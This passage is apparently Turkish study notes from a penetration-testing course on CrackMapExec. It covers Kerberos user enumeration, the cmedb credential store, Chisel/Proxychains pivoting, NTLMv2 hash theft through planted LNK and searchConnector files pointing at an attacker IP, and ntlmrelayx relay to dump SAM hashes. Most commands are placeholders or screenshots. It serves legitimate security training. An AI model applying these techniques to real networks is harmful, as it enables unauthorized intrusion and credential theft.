+CrackMapExec'i -k veya --kerberos seçeneği olmadan bir kullanıcı adı ve parola veya kullanıcı adı ve hash ile kullandığımızda, NTLM kimlik doğrulaması gerçekleştiririz. Kerberos seçeneğini kullanırsak bunun yerine Kerberos kimlik doğrulamasını kullanabiliriz.
+
+### Kerberos Authentication
+![Pasted image 20241203152841.png](/img/user/resimler/Pasted%20image%2020241203152841.png)
+![Pasted image 20241203152849.png](/img/user/resimler/Pasted%20image%2020241203152849.png)
+
+
+
+### Kerberos Kimlik Doğrulaması ile Kullanıcıları Tanımlama
+
+Yeni Kerberos kimlik doğrulama uygulaması ile CrackMapExec, CME içinde kendi Kerbrute'unu oluşturmak için tüm bileşenlere sahiptir. Bu, CME'nin bir kullanıcının domain üzerinde var olup olmadığını ve bu kullanıcının Kerberos ön kimlik doğrulaması (ASREPRoasting) gerektirmeyecek şekilde yapılandırılıp yapılandırılmadığını anlayabileceği anlamına gelir. Bunu aşağıdaki hesaplarla çalışırken görelim: account_not_exist , julio , ve robert .
+
+
+### Kerberos Kimlik Doğrulaması ile Kullanıcıları Tanımlama
+![Pasted image 20241203152959.png](/img/user/resimler/Pasted%20image%2020241203152959.png)
+
+Gördüğümüz gibi, Kerbrute CrackMapExec TGT isteklerini ön kimlik doğrulaması olmadan gönderdiğinden, KDC bir KDC_ERR_C_PRINCIPAL_UNKNOWN hatasıyla yanıt verirse, kullanıcı adı mevcut değildir. Ancak, KDC ön kimlik doğrulaması isterse, KDC_ERR_PREAUTH_FAILED hatasıyla yanıt verir, bu da kullanıcı adının mevcut olduğu anlamına gelir. Son olarak, asreproast saldırısına karşı savunmasız bir hata hesabı görürsek, daha önce AESREPRoast Hesaplarını Bulma bölümünde gördüğümüz gibi AESREPoast saldırılarına karşı hassastır.
+
+Bu, oturum açma hatalarına neden olmaz, bu nedenle herhangi bir hesabı kilitlemez, ancak Kerberos günlüğü etkinleştirilmişse [4768](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) numaralı bir Windows olay kimliği oluşturur.
+
+
+### Using AES-128 or AES-256
+Kerberos Kimlik Doğrulaması için AES-128 veya AES-256 hash'lerini de kullanabiliriz, Impacket'ten Secretsdump gibi araçlar genellikle bu tür hash'leri alabilir. AES-128 veya AES-256 kullanırsak, trafiğimiz normal Kerberos trafiğine daha çok benzeyecek ve operasyonel bir avantajı (opsec) temsil edecektir. Secretsdump'ı kullanalım ve ardından kimlik doğrulaması için AES256'yı kullanalım.
+
+
+### AES256 ile Kimlik Doğrulama
+
+![Pasted image 20241203153254.png](/img/user/resimler/Pasted%20image%2020241203153254.png)
+
+![Pasted image 20241203153303.png](/img/user/resimler/Pasted%20image%2020241203153303.png)
+
+
+### CCache file - Kerberos Authentication
+
+Bir kimlik bilgisi önbelleği (veya [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) ) Kerberos kimlik bilgilerini tutar. Genellikle kullanıcının oturumu sürdüğü sürece geçerli kalırlar, bu nedenle hizmetlere birden fazla kez kimlik doğrulaması yapmak (örneğin, bir web veya posta sunucusuna birden fazla kez bağlanmak) her seferinde KDC ile iletişim kurmayı gerektirmez.
+
+Çoğu durumda, Linux makineleri Kerberos biletlerini ccache dosyaları olarak depolar, sistemlerin biletleri kullanma şekli, ccache dosyasının yolunu gösteren KRB5CCNAME ortam değişkeni aracılığıyla olur. robert kullanıcısı için bir bilet (ccache dosyası) oluşturalım ve DC01'e kimlik doğrulaması yapalım
+
+Bileti oluşturmak için [getTGT.py](https://github.com/fortra/impacket/blob/master/examples/getTGT.py) impacket aracını kullanacağız ve KRB5CCNAME ortam değişkenini getTGT.py tarafından oluşturulan ccache dosyasının yoluna ayarlayacağız.
+
+
+### Ticket Granting Tickets
+
+![Pasted image 20241203153521.png](/img/user/resimler/Pasted%20image%2020241203153521.png)
+
+![Pasted image 20241203153540.png](/img/user/resimler/Pasted%20image%2020241203153540.png)
+
+Kerberos kimlik doğrulama yöntemimiz olarak KRB5CCNAME ortam değişkenini kullanmak için --use-kcache seçeneğini kullanmamız gerekir. Kullanıcı adı ve parola seçenekleri gerekli değildir.
+
+
+### ccache Dosyasını Kerberos Kimlik Doğrulama Yöntemi Olarak Kullanma (SMB Protokolü)
+
+![Pasted image 20241203153620.png](/img/user/resimler/Pasted%20image%2020241203153620.png)
+
+
+### Kerberos Kimlik Doğrulama Yöntemi Olarak ccache Dosyasının Kullanılması (LDAP Protokolü)
+
+![Pasted image 20241203153647.png](/img/user/resimler/Pasted%20image%2020241203153647.png)
+Kerberos Kimlik Doğrulamasını MSSQL protokolü ile kullanmak için hedef olarak IP adresi yerine bilgisayar adını veya FQDN'yi belirtmemiz gerekir. Bunun nedeni, MSSQL protokolünün perde arkasında IP'yi FQDN'ye dönüştürmemesi, ancak SMB ve LDAP protokollerinin bunu yapmasıdır.
+
+
+### MSSQL Protokolü ile ccache Dosyasını Kullanma
+
+![Pasted image 20241203153720.png](/img/user/resimler/Pasted%20image%2020241203153720.png)
+
+Kullanıcı adları ve parolalarla yaptığımız gibi Kerberos kimlik doğrulaması ile herhangi bir modülü veya seçeneği çalıştırabiliriz
+
+
+### Kerberos Kimlik Doğrulaması ile Paylaşımları Listeleme
+
+![Pasted image 20241203153749.png](/img/user/resimler/Pasted%20image%2020241203153749.png)
+![Pasted image 20241203153756.png](/img/user/resimler/Pasted%20image%2020241203153756.png)
+
+
+CrackMapExec ile Kerberos Authentication'ın nasıl kullanılacağını öğrendik. Aşağıdaki bölümde, CrackMapExec veritabanı cmedb ile etkileşime gireceğiz
+
+
+### CMEDB'de Uzmanlaşmak
+
+CME otomatik olarak tüm kullanılan/dökülen kimlik bilgilerini (diğer bilgilerle birlikte) ilk çalıştırmada kurulan SQLite veritabanında saklar. Tüm çalışma alanları ve ilgili veritabanları ~/.cme/workspaces içinde saklanır. Varsayılan veritabanları ~/.cme/workspaces/default dizininde bulunur. Bu dizinde her protokol için bir SQLite dosyası bulunur.
+
+
+### Varsayılan Veritabanlarını Listeleme
+
+![Pasted image 20241203153927.png](/img/user/resimler/Pasted%20image%2020241203153927.png)
+
+### Veritabanı ile Etkileşim
+
+CME, back-end veritabanı ile etkileşimi kolaylaştıran ikinci bir komut satırı script'i olan cmedb ile birlikte gelir. cmedb komutunu yazmak bizi bir komut kabuğuna götürecektir:
+
+### CMEDB
+![Pasted image 20241203154012.png](/img/user/resimler/Pasted%20image%2020241203154012.png)
+
+
+### Workspaces
+Varsayılan çalışma alanı adı varsayılan olarak adlandırılır (bilgi isteminde gösterildiği gibi). Bir çalışma alanı seçildiğinde, CME'de yaptığımız her şey bu çalışma alanında saklanacaktır. Bir çalışma alanı oluşturmak için, cmedb (varsayılan) > komut isteminin root'una gitmemiz gerekir. Eğer protokol veritabanındaysak, geri komutunu kullanmamız gerekir.
+
+
+### Creating a Workspace
+
+![Pasted image 20241203154232.png](/img/user/resimler/Pasted%20image%2020241203154232.png)
+
+Çalışma alanlarını listelemek için workspace list , çalışma alanını değiştirmek için ise workspace "workspace" yazabiliriz.
+
+
+### Çalışma Alanlarını Listeleme ve Değiştirme
+
+
+![Pasted image 20241203154332.png](/img/user/resimler/Pasted%20image%2020241203154332.png)
+![Pasted image 20241203154335.png](/img/user/resimler/Pasted%20image%2020241203154335.png)
+
+
+### Bir Protokolün Veritabanına Erişim
+
+cmedb her protokol için bir veritabanına sahiptir, ancak bu modülün yazıldığı sırada yalnızca SMB ve MSSQL yararlı seçeneklere sahiptir:
+
+![Pasted image 20241203154400.png](/img/user/resimler/Pasted%20image%2020241203154400.png)
+
+Bir protokolün veritabanına erişmek için proto protocol komutunu çalıştırın. Protokol içinde, mevcut seçenekleri görüntülemek için help seçeneğini kullanabiliriz:
+
+
+### SMB Protokol Veritabanına Bağlanma
+![Pasted image 20241203154437.png](/img/user/resimler/Pasted%20image%2020241203154437.png)
+
+
+### Protocol Options
+SMB veya MSSQL protokolünü her kullandığımızda, kimlik bilgileri, saldırdığımız hostlar, eriştiğimiz paylaşımlar ve listelediğimiz gruplar CrackMapExec veritabanında saklanır. Veritabanında sahip olduğumuz verilere erişelim.
+
+### Kimlik Bilgilerini Görüntüleme
+CrackMapExec veritabanı, CrackMapExec kullanarak kullandığımız veya elde ettiğimiz tüm kimlik bilgilerini depolar. Bu veritabanı, kimlik bilgilerinin türünü, düz metin veya hash olup olmadığını, domain, kullanıcı adı ve şifreyi saklar. SMB protokolünün kimlik bilgilerini görmek için protokol içindeki creds seçeneğini kullanmamız gerekir.
+
+
+### Displaying SMB Credentials
+
+![Pasted image 20241203154559.png](/img/user/resimler/Pasted%20image%2020241203154559.png)
+
+![Pasted image 20241203154618.png](/img/user/resimler/Pasted%20image%2020241203154618.png)
+
+Gördüğünüz gibi, creds'ten sonra bir kullanıcı adı ekleyerek belirli kullanıcıları da sorgulayabiliriz. Ayrıca creds hash seçeneği ile tüm hash'leri veya creds plaintext seçeneği ile tüm plaintext kimlik bilgilerini listeleyebiliriz.
+
+
+### Hash'leri ve Düz Metin Kimlik Bilgilerini Görüntüleme
+
+![Pasted image 20241203154648.png](/img/user/resimler/Pasted%20image%2020241203154648.png)
+
+![Pasted image 20241203154654.png](/img/user/resimler/Pasted%20image%2020241203154654.png)
+
+Not: cmedb, mevcut seçenekleri görüntülemek için sekme otomatik tamamlamaya izin verir
+
+MSSQL kimlik bilgileri MSSQL protokolüne kaydedilir ve SMB kimlik bilgilerini görüntülediğimiz gibi görüntülenebilir
+
+
+### MSSQL için Kimlik Bilgilerini Görüntüleme
+![Pasted image 20241203154752.png](/img/user/resimler/Pasted%20image%2020241203154752.png)
+
+Not: Domain alanını bir bilgisayar ile görüyorsak, bu bir MSSQL hesabı kullandığımız anlamına gelir.
+
+
+### Kimlik Bilgilerini Kullanma
+
+CrackMapExec'i çalıştırmak için veritabanındaki kimlik bilgilerini de kullanabiliriz. Kullanmak istediğimiz kimlik bilgilerini tanımlamamız ve hangi id'nin hesapla ilişkili olduğunu belirlememiz gerekir. Julio'nun kimlik bilgilerini id 4 ile kullanalım. Kullanıcı adı ve parola yerine bir kimlik bilgisi kullanmak için -id CredID seçeneğini kullanmamız gerekir.
+
+### CrackMapExec ile Etkileşim için CredID Kullanımı
+
+![Pasted image 20241203154910.png](/img/user/resimler/Pasted%20image%2020241203154910.png)
+
+
+### Hosts Information
+
+MSSQL ve SMB için, erişim sağladığımız bilgisayarları, IP'lerini, domainlerini ve işletim sistemlerini de belirleyebiliriz.
+
+
+### Displaying Hosts
+![Pasted image 20241203155109.png](/img/user/resimler/Pasted%20image%2020241203155109.png)
+
+![Pasted image 20241203155117.png](/img/user/resimler/Pasted%20image%2020241203155117.png)
+
+
+### Share Information
+
+CME veritabanı da belirlediğimiz paylaşımlı klasörleri saklıyor ve okuma ve yazma erişimine sahip kullanıcılarımız olup olmadığını bize söylüyor. Paylaşım bilgilerine erişmek için cmedb içerisinde SMB protokolü içerisinde shares seçeneğini kullanmamız gerekiyor.
+
+### Paylaşımları Geri Alma
+
+![Pasted image 20241203155153.png](/img/user/resimler/Pasted%20image%2020241203155153.png)
+
+
+### Kullanıcı Ekleme ve Kaldırma
+CME, kullanıcıları veritabanından manuel olarak ekleme veya kaldırma özelliğini destekler. Protokolü (SMB veya MSSQL) seçiyoruz ve creds add veya creds remove kullanıyoruz.
+
+
+### cmedb'ye Kullanıcı Ekleme
+
+![Pasted image 20241203155239.png](/img/user/resimler/Pasted%20image%2020241203155239.png)
+Şimdi eklediğimiz kullanıcıyı kaldırmayı deneyebiliriz.
+
+
+### Bir Kullanıcıyı cmedb'den Kaldırma
+
+![Pasted image 20241203155300.png](/img/user/resimler/Pasted%20image%2020241203155300.png)
+
+![Pasted image 20241203155318.png](/img/user/resimler/Pasted%20image%2020241203155318.png)
+
+
+### Empire Kimlik Bilgilerini İçe Aktarma
+cmedb'nin sahip olduğu bir başka özellik de Empire'dan kimlik bilgilerini içe aktarma yeteneğidir.
+
+
+### Import from Empire
+
+![Pasted image 20241203155352.png](/img/user/resimler/Pasted%20image%2020241203155352.png)
+
+Not: Bu özelliği kullanmak istiyorsanız Empire'ı yapılandırdığınızdan emin olun
+
+### Export cmedb Data
+
+CrackMapExec veritabanından kimlik bilgilerini, hostları, local adminleri ve paylaşımları dışarı aktarabiliriz
+
+
+### Kimlik Bilgilerini cmedb'den Dışa Aktarma
+
+![Pasted image 20241203155453.png](/img/user/resimler/Pasted%20image%2020241203155453.png)
+
+![Pasted image 20241203155458.png](/img/user/resimler/Pasted%20image%2020241203155458.png)
+
+Veriler CSV dosyası olarak dışa aktarılır. LibreOffice veya Excel gibi araçları kullanarak açabiliriz.
+
+![Pasted image 20241203155509.png](/img/user/resimler/Pasted%20image%2020241203155509.png)
+
+
+
+### skill 
+
+CrackMapExec aracı hakkında derinlemesine bir eğitim kursu aldıktan sonra ilk Dahili Sızma Testinizi gerçekleştiren bir Sızma Test Uzmanısınız. Müşteriniz INLANEFREIGHT CORP, Active Directory ortamını değerlendirmek için firmanızı işe aldı. İlk göreviniz geçerli bir hesap bulmak ve farklı protokoller kullanarak ortak bir parola denemek. Müşteriniz herhangi bir kesinti süresini göze alamaz, bu nedenle herhangi bir hesabı kilitlememeye dikkat etmeniz gerekir. Geçerli bir hesap bulduğunuzda, diğer hesapları ele geçirmenize yardımcı olacak ilginç bilgileri bulmak için numaralandırın, numaralandırın, numaralandırın. Unutmayın, amacınız alan yöneticisi erişimi elde edene kadar mümkün olduğunca çok hesabı ele geçirmektir. Amacınız hedef etki alanını ele geçirmek ve NTDS dosyasının içeriğini elde etmektir. Bu modülü dikkatle takip ettiyseniz, uzun sürmeyecektir.
+
+
+### Hedef ortama bağlanma adımları
+
+Uzaktan dahili bir sızma testi yapıyorsunuz, bu nedenle önce VPN'e bağlanmanız ve oradan 172.16.15.0/24 hedef ağına dahili numaralandırma yapmanız gerekecek. Dahili şirket ağına bağlanmak için aşağıdaki gibi Chisel ve proxyychains kullanmanız gerekecektir:
+
+
+### Connecting to the Internal Network VPN
+
+![Pasted image 20241203155738.png](/img/user/resimler/Pasted%20image%2020241203155738.png)
+![Pasted image 20241203155743.png](/img/user/resimler/Pasted%20image%2020241203155743.png)
+
+Chisel ile kullanmayı seçtiğiniz bağlantı noktasıyla eşleşmesi için /etc/proxychains.conf dosyasını değiştirmeyi unutmayın.
+
+Hedef sistemi başlattığınızda, 10.129.204.182 örnek IP'sini hedef IP'nizle değiştirin.
+
+Dahili ağı numaralandırmak için şu komutu kullanabilirsiniz: 
+proxychains crackmapexec [protocol] [target] CME ile Proxychains bölümünde gösterildiği gibi., 'print
+
+Dizine gidebilir ve kullanıcının erişebileceği tüm dosyaların bir listesini alabiliriz:
+
+
+### Kullanıcının Kullanabileceği Dosyaları Listeleme
+
+{{CODE_BLOCK_94}}
+
+Eğer paylaşımın tüm içeriğini indirmek istiyorsak `READ_ONLY=false` seçeneğini aşağıdaki gibi kullanabiliriz:
+
+{{CODE_BLOCK_95}}
+
+{{CODE_BLOCK_96}}
+
+Not: Sabırlı olmamız gerekiyor. Paylaşılan klasör ve dosya sayısına bağlı olarak işlem birkaç dakika sürebilir
+
+`spider_plus` modülü için mevcut tüm seçenekleri görüntülemek için `--options` seçeneğini kullanabiliriz:
+
+
+### Spider_plus Options
+
+{{CODE_BLOCK_97}}
+
+Bir sonraki bölümde CrackMapExec'in bir `proxy` aracılığıyla diğer ağlara ulaşmak için nasıl kullanılacağı anlatılacaktır.
+
+
+---
+
+
+### Proxychains with CME
+
+### Scenario
+
+İnternal bir Pentest üzerinde çalışıyoruz. Bir ağ taraması gerçekleştirdik ve yalnızca bir host (10.129.204.133) tespit edip ele geçirebildik. Ele geçirilen bu host üzerinde `ipconfig` çalıştırdığımızda, iki ağ bağdaştırıcısı olduğunu fark ettik. ARP tablosu `172.16.1.10` IP adresine sahip başka bir hostu gösteriyor. Topladığımız bilgilere dayanarak aşağıdaki senaryoya sahibiz:
+
+![Pasted image 20241202141946.png](/img/user/resimler/Pasted%20image%2020241202141946.png)
+
+DC01'e ve bu ağdaki (172.16.1.0/24) herhangi bir makineye saldırmak için, saldırı hostumuz ile MS01 arasında bir `tünel` kurmalıyız. Bu nedenle, CME tarafından yürütülen tüm komutlar MS01 üzerinden geçer.
+
+
+### Set Up the Tunnel
+
+Tünelimizi kurmak için [Chisel](https://github.com/jpillora/chisel) kullanacağız. [Release](https://github.com/jpillora/chisel/releases)'e gidelim ve saldıracağımız makinemiz için en son Windows binary'sini ve saldırı hostumuzda kullanmak için en yeni Linux binary'sini indirelim ve aşağıdaki adımları gerçekleştirelim:
+
+*  Chisel'ı Saldırı Hostumuza indirin ve Çalıştırın:
+
+### Chisel - Reverse Tunnel
+
+{{CODE_BLOCK_98}}
+
+
+*  Chisel for Windows'u İndirin ve Hedef Host'a Yükleyin:
+
+
+### Upload Chisel
+
+{{CODE_BLOCK_99}}
+
+
+* CrackMapExec komut yürütme seçeneği `-x`'i kullanarak Chisel sunucumuza bağlanmak için `chisel.exe` dosyasını çalıştırın (Bu seçeneği Komut Yürütme bölümünde daha fazla tartışacağız)
+
+
+### Connect to the Chisel Server
+
+{{CODE_BLOCK_100}}
+
+Bu terminaldeki komut, hedef makinadaki **Chisel** process'ini durdurana kadar çalışmaya devam edecektir. Bunu bu bölümde daha sonra yapacağız.
+
+**Attack host** üzerinde, **Chisel server** çıktısında **bir client bağlantısı aldığımızı ve tüneli başlattığımızı** gösteren yeni bir satır görmeliyiz.
+
+### Chisel Receiving Session No. 1
+
+{{CODE_BLOCK_101}}
+
+TCP 1080 portunun dinlenip dinlenmediğini kontrol ederek de tünelin çalıştığını doğrulayabiliriz:
+
+
+### Check Listening Port
+
+{{CODE_BLOCK_102}}
+
+* Proxyychains'i Chisel varsayılan portu `TCP 1080`'i kullanacak şekilde yapılandırmamız gerekir. Yapılandırma dosyasının ProxyList bölümüne `socks5 127.0.0.1 1080`'i aşağıdaki gibi eklediğimizden emin olmamız gerekiyor:
+
+
+### Configure Proxychains
+
+{{CODE_BLOCK_103}}
+
+* Artık 172.16.1.10 IP'sine ulaşmak için `Proxychains` aracılığıyla CrackMapExec'i kullanabiliriz:
+
+### CrackMapExec'in Proxychains ile Test Edilmesi
+
+{{CODE_BLOCK_104}}
+
+
+Proxychains çıktısını konsoldan kaldırmak için `Proxychains4` ve `quiet -q` seçeneğini kullanabiliriz:
+
+### Quiet Seçeneği ile Proxychains4
+
+{{CODE_BLOCK_105}}
+
+Proxychains aracılığıyla herhangi bir CME işlemi gerçekleştirebiliriz.
+
+
+### Killing Chisel on the Target Machine
+
+İşimiz bittiğinde, Chisel process'ini kill etmemiz gerekir. Bunu yapmak için, PowerShell komutlarını yürütmek için `-X` seçeneğini kullanacağız ve PowerShell komutunu çalıştıracağız `Stop-Process - Name chisel -Force .` Komut yürütme konusunu Komut Yürütme bölümünde daha ayrıntılı olarak ele alacağız.
+
+
+### Kill the Chisel Client
+
+{{CODE_BLOCK_106}}
+
+Bunu yaptıktan sonra, Chisel client komutunu çalıştırdığımız terminal aşağıdaki gibi sonuçlanmalıdır:
+
+
+### Chisel'i Zorla Durdurduktan Sonra Terminalin Kapanması
+
+{{CODE_BLOCK_107}}
+
+Artık saldırı konağımızdaki Chisel sunucusunu CTRL + C ile kapatabiliriz.
+
+
+### Attack Host Üzerinde Chisel'i Kapatma
+
+{{CODE_BLOCK_108}}
+
+
+### Sunucu olarak Windows ve Client olarak Linux
+
+Chisel'i Windows workstation'da bir sunucu olarak başlatarak ve saldırı hostumuzu client olarak kullanarak bunun tersini de yapabiliriz. Chisel'i sunucu olarak başlatmak için `server --socks5` seçeneğini kullanacağız.
+
+
+### Chisel'i Hedef Makinede Sunucu Olarak Başlatma
+
+{{CODE_BLOCK_109}}
+
+Şimdi hedef makinemiz Chisel sunucusuna bağlanmak ve proxy'yi etkinleştirmek için IP ve porttan sonra `socks` seçeneğini kullanmamız gerekiyor.
+
+
+### Attack Hostumuzdan Chisel Sunucusuna Bağlanma
+
+{{CODE_BLOCK_110}}
+
+Şimdi Proxychains'i tekrar kullanabiliriz:
+
+### Internal Network'e Bağlanmak için Proxy Chain'i Kullanma
+
+{{CODE_BLOCK_111}}
+
+Bu bölümde, **attack host** üzerinde **Proxychains** ve **Chisel** yapılandırmayı ve **CrackMapExec** kullanarak hedef makinede **Chisel** çalıştırmayı öğrendik.
+
+İlerleyen bölümlerde, diğer ağlara ulaşmak için `CrackMapExec` ve `Proxychains` kullanacağız.
+
+---
+
+### Stealing Hashes
+
+Yeni hesapları ele geçirmek için kullanılan en yaygın tekniklerden biri parola hashlerinin çalınmasıdır. Bunu başarmanın farklı yöntemleri vardır, ancak yaygın olanı, bir bilgisayarı veya kullanıcıyı kontrol ettiğimiz sahte bir paylaşılan klasörle bir kimlik doğrulama işlemi başlatmaya zorlamaktır.
+
+Bu kimlik doğrulama işlemini başlatırken, kullanıcı veya bilgisayar bunu bir NTLMv2 hash'i ile yapar. Bu hash, Hashcat gibi bir araç kullanılarak kırılabilir veya kimlik bilgilerini bilmeden kullanıcının kimliğine bürünmek için başka bir bilgisayara iletilebilir.
+
+Paylaşılan klasörleri kullanarak hash'leri çalmak için bir kısayol oluşturabilir ve kısayolda görünen simge sahte paylaşılan klasörümüzü gösterecek şekilde yapılandırabiliriz. Kullanıcı paylaşılan klasöre girdiğinde, simgenin konumunu aramaya çalışacak ve paylaşılan klasörümüze karşı kimlik doğrulamasını zorlayacaktır.
+
+NTLMv2 hash'lerini toplama hakkında daha fazla bilgi edinmek için RedTeam Ekipler için [Farming blogunu okuyabiliriz: MDsec'ten NetNTLM hasadı](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/), sadece kısayolların kullanımını değil, aynı amaca hizmet eden diğer dosya türlerini de gösterir.
+
+
+### Slinky Modülü
+
+`Slinky`, [@byt3bl33d3r](https://twitter.com/byt3bl33d3r) tarafından oluşturulan bir modüldür ve CME'deki en heyecan verici modüllerden biridir. Prensip basittir. Modül, yazma izinlerine sahip tüm paylaşımlarda belirtilen SMB sunucusuna bir UNC yolu içeren simge attribute'a sahip Windows kısayolları oluşturur. Birisi paylaşımı ziyaret ettiğinde, simge attribute'u sunucumuza giden bir UNC yolu içerdiği için `Responder` kullanarak NTLMv2 hash'ini alacağız.
+
+Modülün `SERVER` ve `NAME` olmak üzere iki zorunlu seçeneği ve bir isteğe bağlı `CLEANUP` seçeneği vardır.
+
+
+### Slinky Module Options
+
+{{CODE_BLOCK_112}}
+
+`SERVER`, kontrol ettiğimiz SMB sunucusunun IP'sine ve UNC yolunun işaret etmesini istediğimiz yere karşılık gelir. `NAME` seçeneği kısayol dosyasına bir isim atar, `CLEANUP` ise işimiz bittiğinde kısayolu silmek içindir.
+
+
+### Chisel kullanarak bağlama
+
+Bu alıştırma için lokal erişimi simüle edeceğiz ve internal ağa bağlanmak için Chisel ve Proxychains kullanacağız. Chisel zaten hedef makinemizde bir sunucu olarak çalışıyor ve bir client olarak bağlanmamız ve daha sonra internal ağı numaralandırmak için proxychains kullanmamız gerekiyor. Chisel kullanarak bağlanmak için aşağıdaki komutu **kullanalım**
+
+
+### Hedef Makine Chisel Sunucusuna Bağlanma
+
+{{CODE_BLOCK_113}}
+
+
+### NTLMv2 Hash'lerinin Çalınması
+İlk olarak, `--shares` seçeneğini kullanarak `grace` kullanıcısının `WRITE` ayrıcalıklarına sahip olduğu bir paylaşım bulalım:
+
+### WRITE Ayrıcalıklarına Sahip Paylaşımları Bulma
+
+{{CODE_BLOCK_114}}
+
+
+Gördüğümüz gibi, `grace` `HR` ve `IT-Tools` paylaşımlarına yazabilir. Bu nedenle her bir paylaşıma bir `LNK` dosyası yazmak için `Slinky` modülünü kullanabiliriz. 
+
+**SERVER=10.10.14.33** seçeneğini kullanarak **attack host**'umuzun **tun0** ağındaki **IP adresini** belirteceğiz ve **NAME=important** seçeneğiyle **LNK dosyasına atanacak dosya adını** belirleyeceğiz.
+
+
+### Using Slinky
+
+{{CODE_BLOCK_115}}
+
+
+![Pasted image 20241202171933.png](/img/user/resimler/Pasted%20image%2020241202171933.png)
+
+**Not:** **CrackMapExec**, genellikle **`OpSec` açısından güvenli** olarak kabul edilir çünkü tüm işlemler ya **`bellekte` çalıştırılır**, ya **`WinAPI` çağrılarıyla ağ üzerinden sorgulanır**, ya da **Windows'un built-in araçları/özellikleri** kullanılarak gerçekleştirilir.
+
+Bu gereksinimleri karşılamayan bir modül çalıştırmaya çalıştığımızda, **önceden bir uyarı alırız**. **`Slinky`** modülü, **OpSec açısından güvenli olmayan** bir modüle örnektir. Devam etmeden önce **bir uyarı alacağız**.
+
+LNK dosyası oluşturulduktan sonra, Responder'ı çalıştırmamız ve birinin paylaşıma göz atmasını beklememiz gerekir. 
+
+
+### Starting Responder
+
+{{CODE_BLOCK_116}}
+
+Not: Hash'i yakalamak için `Responder.conf` dosyasında SMB seçeneği `On` olmalıdır.
+
+NTLMv2 hash'imizi aldık ve hesabı kullanmak için onu kırmamız gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kırmak için, `ASREPRoast` ve `Kerberoasting` ile yaptığımız gibi `Hashcat mod 5600`'ü kullanabiliriz. `NTLM Relay`'e odaklanalım.
+
+
+### **NTLM Relay**
+
+Diğer bir çözüm ise NTLMv2 hash'ini doğrudan `SMB Sign`'nın devre dışı bırakıldığı ağdaki diğer sunuculara ve workstation'lara iletmektir. SMB Sign çok önemlidir çünkü bir bilgisayarda SMB Sign etkinse, saldırı hostumuzun kimliğini kanıtlayamayacağımız için o bilgisayara relay yapamayız. SMB Sign'nın devre dışı bırakıldığı hedeflerin bir listesini almak için `--gen-relay-list` seçeneğini kullanabiliriz.
+
+Şimdi Proxychains'i kullanabilir ve SMB Sign devre dışı bırakılmış makinelerin bir listesini alabiliriz
+
+### Getting Relay List
+
+{{CODE_BLOCK_117}}
+
+
+**`ntlmrelayx`** aracını, daha önce **`--gen-relay-list`** seçeneğiyle elde ettiğimiz listeyle birlikte kullanacağız.
+
+Hedef makinede **local administrator** ayrıcalıklarına sahip bir hesap bulursak ve ek seçenekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanıcısının hash'leriyle** bir **`pass-the-hash attack`** gerçekleştirmeyi deneyebiliriz.
+
+### Execute NTLMRelayX
+
+{{CODE_BLOCK_118}}
+
+Bir kullanıcının **SMB share**'ine erişmesini beklemeliyiz. **LNK dosyamız**, kullanıcının hedef makinemize bağlanmasını zorlar (**bu işlem arka planda gerçekleşir ve kullanıcı herhangi bir anormallik fark etmez**).
+
+Bu gerçekleştiğinde, **`ntlmrelayx`** konsolunda aşağıdakine benzer bir çıktı görmeliyiz:
+
+{{CODE_BLOCK_119}}
+
+Ardından, administrator hash'ini kullanarak hedef makinede kimlik doğrulaması yapmak için crackmapexec'i kullanabiliriz:
+
+### Local Hesapları Test Etme
+
+{{CODE_BLOCK_120}}
+
+### Her Şeyi Temizleyin
+
+Modülü kullandıktan sonra, **LNK dosyasını temizlemek** için **`-o CLEANUP=YES`** seçeneğini ve **LNK dosyasının adını** (**`NAME=important`**) belirtmek kritik önem taşır.
+
+### Cleanup
+
+{{CODE_BLOCK_121}}
+
+### drop-sc Modülü ile Hash'lerin Çalınması
+Bu bölümü tamamlamadan önce, **LNK** dışındaki bir dosya formatı kullanarak kimlik doğrulamayı zorlamanın başka bir yöntemine bakalım:[ **.searchConnector-ms**](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry) ve **.library-ms** formatları. Bu dosya formatlarının çoğu Windows sürümünde varsayılan dosya ilişkilendirmeleri bulunur. Windows ile entegre olarak, belirtilen bir WebDAV paylaşımı gibi uzaktaki bir konumu gösterebilecek şekilde, herhangi bir konumdan içerik görüntülemelerini sağlarlar.
+
+Özünde, LNK dosyası ile aynı fonksiyonu yerine getirirler. Bu yöntemin keşfi hakkında daha fazla bilgi edinmek için Windows'ta search connectors ve library dosyalarını keşfetmek başlıklı [blog](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/) yazısını okuyabilirsiniz.
+
+CrackMapExec, paylaşılan bir klasörde bir searchConnector-ms dosyası oluşturmamızı sağlayan drop-sc adlı bir modüle sahiptir. Bunu kullanmak için, SMB fake sunucumuzu hedeflemek için URL seçeneğini belirtmemiz gerekir. Bu durumda, ntlmrelayx çalıştıran hostumuz. URL'nin çift ters eğik çizgi (\) ile kaçması gerekir, örneğin: URL=\\\\10.10.14.33\\secret .
+
+İsteğe bağlı olarak aşağıdaki seçenekleri belirleyebiliriz:
+
+* SHARE=name seçeneği ile hedef paylaşımlı klasör . Bu seçeneği belirtmezsek, dosyayı WRITE izinlerine sahip tüm paylaşımlara yazacaktır
+
+* FILENAME=name seçeneği ile dosya adı . Bu seçeneği belirtmezsek, “Belgeler” adında bir dosya oluşturacaktır.
+
+* Oluşturduğumuz dosyaları temizlemek istiyorsak CLEANUP=True seçeneği. Eğer özel bir isim kullanacaksak filename seçeneğini belirtmemiz gerekiyor.
+
+Drop-sc'yi iş başında görelim:
+
+
+### Dropping a searchConnector-ms File
+
+![Pasted image 20241202202007.png](/img/user/resimler/Pasted%20image%2020241202202007.png)
+
+![Pasted image 20241202202025.png](/img/user/resimler/Pasted%20image%2020241202202025.png)
+
+Bir kullanıcı paylaşılan klasöre eriştiğinde ve ntlmrelayx dinlerken, hedef makineye de aktarım yapabilmeliyiz.
+
+
+### NTLMRelayx ve drop-sc Kullanarak Aktarma
+
+![Pasted image 20241202202103.png](/img/user/resimler/Pasted%20image%2020241202202103.png)
+![Pasted image 20241202202112.png](/img/user/resimler/Pasted%20image%2020241202202112.png)
+
